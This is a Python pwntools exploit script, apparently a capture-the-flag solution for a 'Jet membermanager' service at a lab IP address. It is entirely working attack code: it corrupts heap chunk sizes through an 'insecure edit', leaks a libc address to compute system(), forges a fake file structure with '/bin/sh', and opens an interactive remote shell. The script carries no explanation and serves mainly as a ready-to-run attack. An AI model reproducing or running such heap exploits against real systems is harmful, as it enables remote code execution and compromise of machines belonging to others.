from pwn import *

print("\n[\033[1;32m+\033[1;37m] Jet membermanager ~ GatoGamer1155\n")

if not sys.warnoptions:
    import warnings
    warnings.simplefilter("ignore")

shell = remote('10.13.37.10', 5555)
ldiff = 0x3c5520
rdiff = 0xf7250
sdiff = 0x45390

def add(size, content):
    shell.sendline(b"1")
    shell.recvuntil(b"size:")
    shell.sendline(str(size))
    shell.recvuntil(b"username:")
    shell.sendline(content)
    shell.recvuntil(b"6. exit")

def edit(id, mode, content):
    shell.sendline(b"2")
    shell.recvuntil(b"2. insecure edit")
    shell.sendline(str(mode))
    shell.recvuntil(b"index:")
    shell.sendline(str(id))
    shell.recvuntil(b"new username:")
    shell.sendline(content)
    shell.recvuntil(b"6. exit")

def ban(id):
    shell.sendline(b"3")
    shell.recvuntil(b"index:")
    shell.sendline(str(id))
    shell.recvuntil(b"6. exit")

def change(name):
    shell.sendline(b"4")
    shell.recvuntil(b"enter new name:")
    shell.sendline(name)

name = b"A" * 8
shell.recvuntil(b"enter your name:")
shell.sendline(name)

add(0x88, b"A" * 0x88)
add(0x100, b"B" * 8)
payload = b"D" * 0x160
payload += p64(0)
payload += p64(0x21)
add(0x500, payload)
add(0x88, b"E" * 8)

shell.recv()
ban(2)

payload = b"A" * 0x88
payload += p16(0x281)
edit(0, 2, payload)

shell.recv()
shell.sendline(b"5")
shell.recvline()
libcr = int(shell.recvline()[:-1], 10)
libcb = libcr - rdiff
libcs = libcb + sdiff

payload = p64(0) * 3
payload += p64(libcs)
change(payload)

lall = libcb + ldiff
nptr = 0x6020a0

payload = b"B" * 8*32
payload += b"/bin/sh\x00"
payload += p64(0x61)
payload += p64(0)
payload += p64(lall - 0x10)
payload += p64(2)
payload += p64(3)
payload += p64(0) * 21
payload += p64(nptr)
edit(1, 1, payload)

time.sleep(3)
shell.recv()
shell.sendline(b"1")
shell.recvuntil(b"size:")
shell.sendline(str(0x80))
shell.sendline(b"export TERM=xterm; cd")
shell.interactive()